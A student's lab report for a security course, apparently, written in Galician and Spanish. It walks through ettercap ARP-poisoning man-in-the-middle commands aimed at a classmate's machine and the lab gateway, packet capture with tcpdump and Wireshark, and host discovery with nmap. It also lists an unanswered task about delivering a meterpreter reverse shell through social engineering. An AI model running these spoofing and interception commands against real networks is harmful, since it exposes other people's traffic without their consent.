# **Práctica 2 Legislación e Seguridad Informática**

### **1.-Instale el ettercap y pruebe sus opciones básicas en línea de comando.**

   * Instalación de ettercap

         Instalamos con este comando -> apt install ettercap-text-only

   * Opcions interesantes de ettercap(mirar para mais info en https://linux.die.net/man/8/ettercap):

         Estructura do comando -> ettercap [FLAGS] [T1] [T2]

         * FLAGS (poden ir en calquer orden creo e non fai falta usar todos):
     
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-T / -G -> executar ettercap en modo texto / executar ettercap en unha interfaz GTK2                      |
             |                                                                                                          |
             |Subflag para -T:                                                                                          |
             |-q  -> modo silencioso, non imprime o contido dos paquetes. Interesante si queremos recoller os archivos  |
             | en un .pcap (explicado no ejercicio 2)                                                                   |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-i <interfaz de red> -> para especificar a interfaz                                                       |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-w <name file> -> para escribir en un ficheiro con extension .pcap                                        |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-P <pluging> -> especificar que plugin usar                                                               |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|
             |                                                                                                          |
             |-M <metodos:argumentos> -> fai un ataque MITM(man in the middle).                                         |
             |                                                                                                          |                                                                                                   
             |Subflags para -M:                                                                                         |
             |arp:remote/oneway -> para facer un arp poisoning(ARP spoofing)                                            |
             |icmp:MAC/IP -> ataque de redireccionamento icmp                                                           |
             |DHCP:ip_pool/netmask/dns -> para un dhcp spoofing                                                         |
             |port:remote/tree -> roubo de puertos                                                                      |
             |                                                                                                          |
             |----------------------------------------------------------------------------------------------------------|

         * T1/T2 -> poden ser direccions MAC, IPs, IPv6 ou puertos

     > Exemplos:
     
     >  ettercap -T -q -i ens33 -M arp:remote //ipvictima/ //ipsalida/

     >  ettercap -T -q -i ens33 -w ettercap.pcap -M arp:remote /ipvictima// /ipsalida//

     >  ettercap -T  -q -P repoison_arp -M arp:remote /ipvictima// /ipsalida//

### **2.-Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)**

   Para capturar a paqueteria da victima, facemos un ataque MITM(o atacante observa e intercepta mensaxes que recibe de todos os movementos da victima).

   Vamos usar ettercap para esnifar a paqueteria do compa, instalar tcpdump para ver a paqueteria que recollemos e wireshark(en local) para visualizar en un ficheiro .pcap(extension usada para 
   captura de paqueteria) a paqueteria esnifada. Instalamos Wireshark na nosa máquina local xa que a de lsi non ten intefaz gráfica.

   Pasos previos antes de facer os subapartados:

   1)O atacante fai sniffing ao trafico do compañeiro:

       1ºforma ->  ettercap -T -q -i ens33 -M arp:remote //ipcompa/ //10.11.48.1/ (sniffing da paqueteria)
                   Mentras esfina, en outro terminal:
                   tcpdump -i ens33 -s 65535 -w compa.pcap (para gardar o trafico capturado)

       2ºforma (creo)->  ettercap -T -q -i ens33 -w ettercap.pcap -M arp:remote /ipvictima// /ipsalida// (esnifa e captura a paqueteria á vez)

   2)Mentres o atacante fai o sniffing e garda a paqueteria(tcpdump), a victima busca imagenes,paginas,archivos en http (https non sirve xa que a info está cifrada):

       curl http://w3af.org/
       curl http://www.edu4java.com/_img/web/http.png

   3)O atacante sale de ettercap con q (si salimos con ctrl+c tiramos ca conexion do compañeiro), fai ctrl+c no terminal onde está o tcpdump e enviamos o archivo á nosa maquina local:

      1ºforma -> si temos windows e nos conectamos por ssh con mobaXTerm ou Bitvise SSH con arrastrar o archivo ao noso ordenador xa está.

      2ºforma -> si non temos acceso ao noso arbol de directorios da maquina de lsi ou temos Linux executamos -> scp lsi@ipens33 rutaArchivo

  4)Abrimos Wireshark:

     1º)Arriba en archivos damoslle a abrir e seleccionamos o archivo .pcap e veriamos toda a paqueteria que se capturou co ettercap

  * Identifique los campos de cabecera de un paquete TCP

        Na lista da paqueteria buscamos un paquete TCP, pinchamos en un e abaixo ponnos as seguintes lineas:

            Frame 59: 165 bytes on wire (1320 bits), 165 bytes captured (1320 bits)
            Ethernet II, Src: VMware_97:24:d0 (00:50:56:97:24:d0), Dst: VMware_97:d5:d9 (00:50:56:97:d5:d9)
            .
            .
            .
            [SEQ/ACK analysis]
            TCP payload (111 bytes)      

  * Filtre la captura para obtener el tráfico HTTP

        Na barra de filtrado poñemos 'http' e veriamos en cada consulta a peticion get para capturar os datos e o codigo da consulta
    
  * Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)


  * Visualice la paquetería TCP de una determinada sesión.

        Vamos a 'analizar' > 'seguir' > secuencia tcp

  * Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.

        Vamos a 'Estadísticas' > Jerarquia de protocolo

  * Obtenga información del tráfico de las distintas “conversaciones” mantenidas.

        Vamos a 'Estadísticas' > Conversaciones

  * Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.

        Vamos a 'Estadísticas' > Puntos finales


### 3.-Obtenga la relación de las direcciones MAC de los equipos de su segmento.

      1º forma(hai que instalar nmap):
      
      Executamos -> nmap -sP 10.11.48.0/23
      nmap é unha ferramenta que escanea a rede. [-sp] fai un 'ping scan' da ip ou rango de ip que pasemos, neste caso desde o 10.11.48.0 a 10.11.49.255


      2º forma(hai que instalar nast):
      
      Executamos -> nast -m -i ens33 
      nast é unha ferramenta que se utiliza para analizar e visualizar o tráfico de rede en tempo real. [-m] mostra en tempo real a lista de hosts dunha LAN.
      [-i] para especificar a interfaz


### 4.-Obtenga la relación de las direcciones IPv6 de su segmento.

    1º)Executamos o comando -> ping6 -c 2 -I ens33 ff02::1, onde [-c 2] quere decir o nº de ping que faremos, [-I] a interfaz e por ultimo a direccion ipv6 multicast(todos os nodos na LAN)
    
    2º) facemos ->  ip -6  neigh . Esto sirve para analizar a cache de ipv6. Si executamos o anterior comando e uns segundos depois, este, indicanos as direccions ipv6 que responderon do noso
    segmento

### 5.-Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.


### 6.-Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.


### 7.-Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
               
     
